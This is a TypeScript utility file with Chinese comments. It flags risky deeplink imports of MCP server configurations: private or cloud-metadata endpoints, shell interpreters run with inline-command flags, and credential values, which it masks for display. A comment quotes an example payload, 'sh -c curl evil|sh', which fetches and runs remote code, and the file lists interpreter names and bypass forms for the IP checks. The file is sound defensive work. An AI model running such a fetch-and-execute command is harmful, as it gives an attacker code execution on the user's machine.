// deeplink 导入确认框的取值呈现工具。
//
// 这里的所有判定**只用于 UI 提示，不参与任何拦截决策**。深链接携带的自定义
// endpoint 与 env 是第三方供应商的正常配置能力（`http://localhost:11434` 就是
// Ollama / LM Studio 的常规用法），拦下来会打断合法场景。真正的缺口是用户在
// 点「导入」时看不到自己在同意什么——所以补的是可见性，不是黑名单。

//
// env 键不在这里判定：按工具的允许清单 / 拒绝清单由后端
// `deeplink/env_allowlist.rs` 裁决并真正拦截，确认框只展示
// `preview_deeplink_import` 返回的结论（MH-4）。

export type RiskKind = "envHijack" | "privateEndpoint" | "shellCommand";

/** 会被 shell 解释成"执行下面这段字符串"的调用形态。 */
const SHELL_INTERPRETERS = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "fish",
  "csh",
  "tcsh",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "pwsh.exe",
]);

/**
 * 「下一个参数是要执行的命令串」这一族开关。
 *
 * 不能只比 `-c`：POSIX shell 允许把单字母开关并成一串（`bash -lc`、`sh -eco pipefail`
 * 之类），Windows 侧则是 `/c` `/k` 且大小写不敏感，PowerShell 还有 `-Command`
 * 的各种缩写。这里按形态判定而不是枚举字面量。
 */
function isInlineCommandFlag(arg: string): boolean {
  const lower = arg.toLowerCase();

  // cmd.exe：/c、/k，可带后缀（/c:）
  if (/^\/[ck]\b/.test(lower)) return true;

  // PowerShell：-Command / -c 及其任意合法缩写（-comm、-comma…）
  if (/^-c(o(m(m(a(n(d)?)?)?)?)?)?$/.test(lower)) return true;
  if (lower === "-encodedcommand" || lower === "-e" || lower === "-ec") {
    return true;
  }

  // POSIX shell：单横线 + 一串短开关，其中含 c（-c、-lc、-ec、-eco…）
  if (/^-[a-z]*c[a-z]*$/.test(lower)) return true;

  return false;
}

/**
 * 判定是否为环回 / 私网 / 云元数据地址。
 *
 * 只做**字面量**匹配，不做 DNS 解析：解析会引入超时，而且解析结果与客户端稍后
 * 实际连接时的结果可以不同（DNS rebinding），拿它当防线是虚假的确定性。作为
 * "这个地址看着像内网，你确认吗"的提示，字面量匹配已经够用。
 */
/**
 * 取出主机的 IPv4 四元组，兼容 IPv4-mapped IPv6。
 *
 * `new URL("http://[::ffff:127.0.0.1]/")` 会把主机**归一成十六进制**
 * `[::ffff:7f00:1]`，点分形式在这一步就消失了，只按 `\d+\.\d+\.\d+\.\d+`
 * 匹配会整类漏掉——`[::ffff:169.254.169.254]` 同理会绕过内网判定。
 */
function extractIpv4Octets(bare: string): [number, number] | null {
  const dotted = bare.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (dotted) return [Number(dotted[1]), Number(dotted[2])];

  // ::ffff:7f00:1 → 0x7f00 0x0001 → 127.0.0.1
  const mapped = bare.match(/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (mapped) {
    const high = parseInt(mapped[1], 16);
    return [(high >> 8) & 0xff, high & 0xff];
  }

  // 少数实现保留点分尾巴：::ffff:127.0.0.1
  const mappedDotted = bare.match(
    /^::ffff:(\d{1,3})\.(\d{1,3})\.\d{1,3}\.\d{1,3}$/,
  );
  if (mappedDotted) {
    return [Number(mappedDotted[1]), Number(mappedDotted[2])];
  }

  return null;
}

export function classifyEndpoint(rawUrl: unknown): RiskKind | null {
  if (typeof rawUrl !== "string") return null;

  let host: string;
  try {
    host = new URL(rawUrl).hostname.toLowerCase();
  } catch {
    return null;
  }

  // URL 会把 IPv6 主机保留在方括号里
  const bare =
    host.startsWith("[") && host.endsWith("]") ? host.slice(1, -1) : host;

  if (
    bare === "localhost" ||
    bare.endsWith(".localhost") ||
    bare.endsWith(".local") ||
    bare.endsWith(".internal") ||
    bare === "::1" ||
    bare === "::" ||
    bare === "0.0.0.0"
  ) {
    return "privateEndpoint";
  }

  const octets = extractIpv4Octets(bare);
  if (octets) {
    const [a, b] = octets;
    if (
      a === 127 || // 环回
      a === 10 || // RFC 1918
      a === 0 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) // 链路本地，含 AWS/GCP 元数据 169.254.169.254
    ) {
      return "privateEndpoint";
    }
  }

  // IPv6 唯一本地地址 fc00::/7 与链路本地 fe80::/10
  if (/^f[cd][0-9a-f]{2}:/.test(bare) || /^fe[89ab][0-9a-f]:/.test(bare)) {
    return "privateEndpoint";
  }

  return null;
}

/**
 * MCP server 的 `command` + `args`。
 *
 * 单看 `command` 完全不够：真实 payload 是 `command: "sh"` 配
 * `args: ["-c", "curl evil|sh"]`，界面上只渲染 command 时它显示成无害的 `sh`。
 *
 * 两个参数都声明成 `unknown`：它们来自深链接里 base64 解码后的任意 JSON，TS 的
 * 类型标注在这个边界上不设防。写成 `string` 而实际收到对象或数字时 `.split()`
 * 会抛错，把整个确认框炸成空白——那比显示一条误导性的 `Command: sh` 更糟，因为
 * 用户连"有东西要导入"都看不到了。
 */
export function classifyCommand(
  command: unknown,
  args?: unknown,
): RiskKind | null {
  if (typeof command !== "string" || !command) return null;

  // 只取基名：`/bin/sh` 与 `sh` 是同一回事
  const base = command.split(/[/\\]/).pop()?.toLowerCase() ?? "";
  if (!SHELL_INTERPRETERS.has(base)) return null;

  if (!Array.isArray(args)) return null;
  return args.some((arg) => typeof arg === "string" && isInlineCommandFlag(arg))
    ? "shellCommand"
    : null;
}

/**
 * 键名里出现这些词时，其取值按凭据处理。按词比较而不是按子串：
 * `MAX_OUTPUT_TOKENS` 是计数，`MONKEY` 也不是 key。
 */
const SENSITIVE_WORDS = new Set([
  "TOKEN",
  "KEY",
  "APIKEY",
  "SECRET",
  "PASSWORD",
  "PASSWD",
  "AUTHORIZATION",
  "CREDENTIAL",
  "CREDENTIALS",
  "COOKIE",
]);

export function isSensitiveKey(key: string): boolean {
  return key
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toUpperCase()
    .split(/[^A-Z0-9]+/)
    .some((word) => SENSITIVE_WORDS.has(word));
}

/** 凭据只露末 4 位，与确认框里 API Key 的「末 4 位」同一口径。 */
const MASK = "••••";

export function maskSecret(value: string): string {
  return value.length > 8 ? `${MASK}${value.slice(-4)}` : MASK;
}

/**
 * 凭据类取值的展示脱敏。
 *
 * 原先是 `DeepLinkImportDialog` 内的组件闭包；MCP 确认页也要展示 env，抽出来是
 * 为了两处共用同一套规则——各写一份迟早会漂移成两种脱敏口径。
 * 短值不脱敏：否则连"是不是空的"都看不出来。
 */
export function maskValue(key: string, value: string): string {
  if (isSensitiveKey(key) && value.length > 8) return maskSecret(value);
  return value;
}

/** 最短按凭据遮盖的长度：更短的串很可能也出现在别处（模型名、路径），遮了反而看不懂。 */
const MIN_SECRET_LENGTH = 6;

/**
 * 「将保存的完整内容」里出现的凭据：凭据类键名下的字符串值。
 * 内容来自后端的 JSON 预览；解析失败时返回空，只靠调用方传入的已知凭据遮盖。
 */
export function collectSecretValues(content: string): string[] {
  let parsed: unknown;
  try {
    parsed = JSON.parse(content);
  } catch {
    return [];
  }
  const found = new Set<string>();
  const walk = (value: unknown, key: string, depth: number) => {
    if (depth > 32 || value === null) return;
    if (typeof value === "string") {
      // 纯数字是计数或开关，不是凭据。
      if (
        key &&
        isSensitiveKey(key) &&
        value.trim().length >= MIN_SECRET_LENGTH &&
        /[A-Za-z]/.test(value)
      ) {
        found.add(value);
      }
      return;
    }
    if (Array.isArray(value)) {
      value.forEach((item) => walk(item, key, depth + 1));
      return;
    }
    if (typeof value === "object") {
      for (const [child, item] of Object.entries(value)) {
        walk(item, child, depth + 1);
      }
    }
  };
  walk(parsed, "", 0);
  return [...found];
}

/**
 * 把文本里的凭据换成「末 4 位」形式，只用于展示。
 * 同时替换原文和 JSON 转义后的写法：预览内容是 JSON，凭据在其中以转义形式出现。
 */
export function maskSecrets(text: string, secrets: Iterable<string>): string {
  const forms = new Map<string, string>();
  for (const secret of secrets) {
    for (const value of [secret, secret.trim()]) {
      if (value.length < MIN_SECRET_LENGTH) continue;
      const masked = maskSecret(value);
      forms.set(value, masked);
      forms.set(JSON.stringify(value).slice(1, -1), masked);
    }
  }
  // 长的先换：一个凭据可能包含另一个。
  return [...forms.entries()]
    .sort(([a], [b]) => b.length - a.length)
    .reduce((result, [form, masked]) => result.split(form).join(masked), text);
}

/** 风险种类 → i18n key。 */
export function riskI18nKey(kind: RiskKind): string {
  return `deeplink.risk.${kind}`;
}
